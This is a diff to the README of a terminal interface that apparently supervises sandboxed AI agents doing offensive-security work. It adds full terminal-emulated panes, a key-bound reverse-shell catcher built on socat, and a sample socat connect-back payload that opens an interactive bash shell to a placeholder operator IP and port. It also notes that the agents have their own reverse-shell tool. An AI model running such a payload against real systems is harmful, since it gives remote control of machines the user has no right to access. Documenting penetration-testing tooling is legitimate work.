@@ -107,7 +107,9 @@ Press `Ctrl-b`, then one of these keys:
 | `g` / `G` | jump the focused pane to the top / bottom |
 | `z` | zoom the focused pane |
 | `x` | close the focused pane |
-| `$` | open a shell pane |
+| `$` | open a shell pane (line-oriented) |
+| `T` | open a fully terminal-emulated pane (vim/htop work) |
+| `L` | open a fully-emulated reverse-shell catcher (enter a port) |
 | `[` | copy mode |
 | `c` | new window (tab) |
 | `n` | next window |
@@ -115,7 +117,7 @@ Press `Ctrl-b`, then one of these keys:
 | `&` | close the current window |
 | `p` / `P` | pause the focused agent / all agents |
 | `r` / `R` | resume the focused agent / all agents |
-| `K` | kill the focused agent |
+| `K` | kill the focused agent, or a command pane's backing process (listener / reverse shell / command) |
 | `S` | stop the commands the focused agent (or shell) is running |
 | `s` | refresh the Summary and Diagram panes now |
 | `d` | refresh the Diagram pane now |
@@ -138,15 +140,38 @@ click a tab to switch to it.
 
 ### Command panes
 
-The **command panes** section of the Options sidebar lists two kinds of pane you
-can type into directly: your own shell panes and the agents' reverse-shell
-channels.
+The **command panes** section of the Options sidebar lists the panes you can type
+into directly: your own shell panes, fully terminal-emulated panes, and the agents'
+reverse-shell channels.
 
-**Shell panes.** `Ctrl-b $` opens a shell pane that runs commands in the sandbox as
-root. With a shell pane focused, the input line shows a `$` prompt; type a command
-and press Enter, and the output appears in the pane. The working directory is kept
-across commands. `Ctrl-b S` stops a running command. The egress firewall restricts
-agents, not your own shell.
+**Shell panes.** `Ctrl-b $` opens a line-oriented shell pane that runs commands in
+the sandbox as root. With a shell pane focused, the input line shows a `$` prompt;
+type a command and press Enter, and the output appears in the pane. The working
+directory is kept across commands. `Ctrl-b S` stops a running command. This is the
+quick, scriptable shell; for full-screen programs use a terminal pane. The egress
+firewall restricts agents, not your own shell.
+
+**Terminal panes (full emulation).** `Ctrl-b T` opens a fully terminal-emulated
+pane: a real pseudo-terminal in the sandbox driven by a VT emulator, so vim, htop,
+less, tmux and anything else that drives the terminal work exactly as in a native
+terminal. While a terminal pane is focused, every keystroke goes straight to the
+program; `Ctrl-b` is the one exception, held back as oline's prefix (press
+`Ctrl-b` twice to send a literal `Ctrl-b`). The pane resizes with the layout (live
+on the QEMU backend; fixed at open on WSL). It needs `script` (util-linux) on the
+WSL backend; QEMU uses the SSH server's own PTY.
+
+**Fully-emulated reverse shells.** `Ctrl-b L` asks for a TCP port and opens a
+terminal pane that listens for a reverse shell on it with a PTY on both ends (via
+`socat`), so a caught shell is a real interactive terminal, not a line pipe. Have the
+target connect back with a PTY payload, for example:
+
+```
+socat tcp:<your-ip>:<port> exec:'bash -li',pty,stderr,setsid,sigint,sane
+```
+
+`socat` must be installed in the sandbox. This is the operator's full-emulation path
+and is separate from the agents' line-oriented `revshell` channels below (which they
+drive programmatically).
 
 **Reverse-shell channels.** When an agent sets up a reverse-shell listener (with its
 `revshell` tool), the channel appears in the command-panes list as a `⇄` row with
@@ -162,7 +187,9 @@ listener running.
 `Ctrl-b p` pauses the focused agent immediately, cancelling its model stream and
 the command it is running; `Ctrl-b r` resumes it. `Ctrl-b P` pauses everything and
 stops new agents from spawning; `Ctrl-b R` resumes everything. `Ctrl-b K` kills the
-focused agent.
+focused agent; on a command pane it kills what that pane is backed by instead and
+closes it: a terminal pane's PTY session (its shell, listener, or caught reverse
+shell), a reverse-shell channel's listener, or a shell pane's running command.
 
 ### Stop a command
 
